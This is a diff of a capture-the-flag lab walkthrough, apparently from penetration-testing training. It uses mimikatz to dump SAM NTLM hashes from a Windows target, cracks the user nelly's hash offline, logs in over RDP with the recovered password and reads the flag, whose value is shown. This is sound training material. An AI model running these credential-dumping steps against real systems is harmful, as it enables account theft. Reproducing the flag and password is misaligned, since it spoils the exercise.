@@ -145,25 +145,25 @@ Lab 1 - Follow the steps outlined in this section and find the flag on the nelly
 ># 2) (On the Windows target) Run PowerShell "As Administrator" to allow credential dumping
 >
 ># 3) Enumerate local users to confirm the target user (nelly) exists and is enabled
->Get-LocalUser
+>PS C:\Windows\system32> Get-LocalUser
 >
 ># 4) Move to the tools directory where mimikatz is stored
->cd C:\tools
+>PS C:\Windows\system32> cd C:\tools
 >
 ># 5) Confirm mimikatz.exe is present
->ls
+>PS C:\tools> ls
 >
 ># 6) Launch mimikatz
->.\mimikatz.exe
+>PS C:\tools> .\mimikatz.exe
 >
 ># 7) Enable SeDebugPrivilege (required for many privileged actions)
->privilege::debug
+>mimikatz # privilege::debug
 >
 ># 8) Elevate / impersonate SYSTEM to gain maximum local privileges
->token::elevate
+>mimikatz # token::elevate
 >
 ># 9) Dump local SAM database hashes (extract NTLM hashes for local users, including nelly)
->lsadump::sam
+>mimikatz # lsadump::sam
 >
 ># 10) (Back on Kali) Save nelly's NTLM hash to a file for offline cracking
 >kali@kali:~$ cat > nelly.hash << EOF
@@ -184,14 +184,13 @@ Lab 1 - Follow the steps outlined in this section and find the flag on the nelly
 >kali@kali:~$ xfreerdp3 /u:nelly /p:nicole1 /v:192.168.241.210 /cert:ignore
 >
 ># 15) Navigate to nelly's Desktop where the flag is stored
->cd C:\Users\nelly\Desktop
+>PS C:\Windows\system32> cd C:\Users\nelly\Desktop
 >
 ># 16) List files on the Desktop to identify the flag
->ls
+>PS C:\Users\nelly\Desktop> ls
 >
 ># 17) Display the contents of the flag file to complete the lab
->type flag.txt
->
+>PS C:\Users\nelly\Desktop> type flag.txt
 >```
 >OS{251d3e79de2a2f9ad4cb9551f18b6f81}
 
